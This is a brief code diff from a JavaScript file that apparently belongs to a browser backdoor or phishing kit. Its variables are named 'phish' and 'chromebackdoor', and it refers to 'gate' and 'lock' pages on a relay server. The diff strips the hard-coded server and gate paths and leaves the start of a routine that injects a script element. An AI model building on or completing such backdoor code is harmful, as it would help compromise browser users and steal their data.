@@ -3,9 +3,8 @@ $(document).ready(function()
     var phish = "";
     var version = 'Build001';
     var tabURL = window.location.href;
-    var server_web = "http://localhost:8888/taff/private/chromebackdoor/"
-    var lock_page = "relais/lock.php"
-    var gate_page = "relais/index.php"
+    
+    //settings
     
     var v = document.createElement('script');
     v.type = 'text/javascript';
